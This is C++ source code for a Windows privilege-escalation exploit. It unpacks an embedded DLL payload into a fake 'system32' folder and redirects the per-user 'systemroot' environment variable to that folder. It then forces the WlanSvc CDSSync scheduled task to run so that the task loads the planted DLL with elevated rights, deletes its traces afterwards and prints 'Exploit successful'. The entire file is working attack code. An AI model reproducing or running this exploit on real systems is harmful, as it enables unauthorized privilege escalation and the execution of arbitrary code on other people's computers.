#include <Windows.h>
#include <taskschd.h>
#include <ShlObj.h>
#include <iostream>
#include <string>

#include "resource.h"

EXTERN_C IMAGE_DOS_HEADER __ImageBase;

int main()
{
	auto* hConsole = GetStdHandle(STD_OUTPUT_HANDLE);

	auto* hResInfo = FindResourceW(reinterpret_cast<HMODULE>(&__ImageBase), MAKEINTRESOURCEW(IDR_DLLPAYLOAD), L"PAYLOAD");
	if (!hResInfo)
	{
		std::wcout << L"FindResourceW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* hResource = LoadResource(reinterpret_cast<HMODULE>(&__ImageBase), hResInfo);
	if (!hResource)
	{
		std::wcout << L"LoadResource() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* pResource = LockResource(hResource);
	if (!pResource)
	{
		std::wcout << L"LockResource() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	if (!CreateDirectoryW(L"system32", nullptr))
	{
		std::wcout << L"CreateDirectoryW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	auto* hFile = CreateFileW(L"system32\\npmproxy.dll", FILE_WRITE_ACCESS, 0, nullptr, CREATE_NEW,
		FILE_ATTRIBUTE_NORMAL, nullptr);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		RemoveDirectoryW(L"system32");
		std::wcout << L"CreateFileW() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}
	DWORD writtenBytes;
	const auto result = WriteFile(hFile, pResource, SizeofResource(reinterpret_cast<HMODULE>(&__ImageBase), hResInfo),
		&writtenBytes, nullptr);
	CloseHandle(hFile);
	if (!result)
	{
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"WriteFile() failed. Error: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	auto hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE | COINIT_SPEED_OVER_MEMORY);
	if (FAILED(hr))
	{
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"CoInitializeEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	ITaskService* taskService;
	hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService,
		reinterpret_cast<LPVOID*>(&taskService));
	if (FAILED(hr))
	{
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"CoCreateInstance() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	const VARIANT variant{ {{VT_NULL, 0}} };
	hr = taskService->Connect(variant, variant, variant, variant);
	if (FAILED(hr))
	{
		taskService->Release();
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"ITaskService::Connect() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	auto* wdi = SysAllocString(L"Microsoft\\Windows\\WDI");
	ITaskFolder* wdiFolder;
	hr = taskService->GetFolder(wdi, &wdiFolder);
	SysFreeString(wdi);
	if (FAILED(hr))
	{
		taskService->Release();
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"ITaskService::GetFolder() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	wdi = SysAllocString(L"\\ResolutionHost");
	IRegisteredTask* wdiTask;
	hr = wdiFolder->GetTask(wdi, &wdiTask);
	wdiFolder->Release();
	SysFreeString(wdi);
	if (FAILED(hr))
	{
		taskService->Release();
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"ITaskService::GetTask() (0) failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}

	TASK_STATE state;
	hr = wdiTask->get_State(&state);
	if (FAILED(hr))
	{
		wdiTask->Release();
		taskService->Release();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"IRegisteredTask::get_State() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	if (state == TASK_STATE_RUNNING)
	{
		hr = wdiTask->Stop(0);
		if (FAILED(hr))
		{
			wdiTask->Release();
			taskService->Release();
			DeleteFileW(L"system32\\npmproxy.dll");
			RemoveDirectoryW(L"system32");
			std::wcout << L"IRegisteredTask::Stop() failed. HRESULT: 0x" << std::hex << hr << std::endl;
			return EXIT_FAILURE;
		}
	}
	wdiTask->Release();

	auto* diagPath = SysAllocString(L"\\Microsoft\\Windows\\WlanSvc");
	ITaskFolder* taskFolder;
	hr = taskService->GetFolder(diagPath, &taskFolder);
	SysFreeString(diagPath);
	taskService->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"ITaskService::GetFolder() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
	}

	auto* diagTaskPath = SysAllocString(L"\\CDSSync");
	IRegisteredTask* diagTask;
	hr = taskFolder->GetTask(diagTaskPath, &diagTask);
	SysFreeString(diagTaskPath);
	taskFolder->Release();
	if (FAILED(hr))
	{
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"ITaskFolder::GetTask() (1) failed. HRESULT: 0x" << std::hex << hr << std::endl;
	}

	const auto requiredSize = static_cast<ULONG_PTR>(GetCurrentDirectoryW(0, nullptr));
	auto currentDirectory = new WCHAR[requiredSize + 1];
	GetCurrentDirectoryW(static_cast<DWORD>(requiredSize), currentDirectory);

	const auto status = RegSetKeyValueW(HKEY_CURRENT_USER, L"Environment", L"systemroot", REG_SZ, currentDirectory,
		requiredSize * sizeof(WCHAR) + sizeof(L'\0'));
	delete[] currentDirectory;
	if (status)
	{
		diagTask->Release();
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"RegSetKeyValueW() failed. LSTATUS: " << status << std::endl;
		return EXIT_FAILURE;
	}

	IRunningTask* runningTask;
	hr = diagTask->RunEx(variant, TASK_RUN_IGNORE_CONSTRAINTS, 0, nullptr, &runningTask);
	if (FAILED(hr))
	{
		diagTask->Release();
		RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"systemroot");
		CoUninitialize();
		DeleteFileW(L"system32\\npmproxy.dll");
		RemoveDirectoryW(L"system32");
		std::wcout << L"IRegisteredTask::RunEx() failed. HRESULT: 0x" << std::hex << hr << std::endl;
		return EXIT_FAILURE;
	}
	Sleep(500);

	LONG taskResult;
	diagTask->get_LastTaskResult(&taskResult);
	diagTask->Release();
	runningTask->Release();
	CoUninitialize();
	RegDeleteKeyValueW(HKEY_CURRENT_USER, L"Environment", L"systemroot");
	DeleteFileW(L"system32\\npmproxy.dll");
	RemoveDirectoryW(L"system32");
	
	if (taskResult != ERROR_SUCCESS)
	{
		std::wcout << L"The task process failed. Process exit code: " << taskResult << std::endl;
		return EXIT_FAILURE;
	}
	
	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
	std::wcout << L">>> ";
	SetConsoleTextAttribute(hConsole, FOREGROUND_INTENSITY);
	std::wcout << L"[!] ";
	SetConsoleTextAttribute(hConsole, FOREGROUND_GREEN);
	std::wcout << L"Exploit successful.\n\n";
	SetConsoleTextAttribute(hConsole, 7);
	
	return 0;
}